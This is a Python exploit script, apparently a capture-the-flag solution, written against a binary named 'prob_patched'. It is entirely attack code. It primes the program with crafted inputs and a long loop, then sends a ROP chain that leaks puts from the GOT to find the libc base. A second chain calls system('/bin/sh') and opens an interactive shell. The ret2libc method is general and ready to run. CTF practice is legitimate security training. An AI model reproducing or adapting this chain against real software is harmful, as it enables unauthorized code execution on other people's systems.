#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./prob_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw, aslr=False)

gdbscript = '''

# b *0x401488
b *0x40143b
b *0x401445
c
'''.format(**locals())

p = start()

# ==================== EXPLOIT ====================

def exploit():

    pop_rdi = 0x40129b
    ret = 0x40101a
    offset = 0x28

    p.sendafter(b'> ', b'Decision2Solve\0\0')
    p.send(p64(exe.sym.safe))
    p.send(p64(exe.sym.main)[:6])
    p.sendafter(b'> ', b'1')


    for _ in range(0x400):
            p.sendafter(b'> ', b'A'*16)
            p.sendafter(b'> ', b'1') 


    p.sendafter(b'>', b'A'*16)
    p.sendafter(b'> ', b'2')
    payload = flat({

            offset: [

                pop_rdi, 
                exe.got.puts,
                0,
                exe.plt.puts,
                exe.sym.unsafe_func
            ]

        }, filler=b'\0')

    payload = payload.ljust(0x10000, b'.')
    p.send(payload)

    puts = u64(rl()[:-1].ljust(0x8, b'\0'))
    libc.address = puts - libc.sym.puts
    slog('puts', puts)
    slog('lib base', libc.address)

    payload = flat({

            offset: [
                ret,
                pop_rdi, 
                next(libc.search(b'/bin/sh\0')),
                0,
                libc.sym.system,
            ]

        }, filler=b'\0')

    payload = payload.ljust(0x10000, b'.')
    p.send(payload)



    p.interactive()

if __name__ == '__main__':
    exploit()
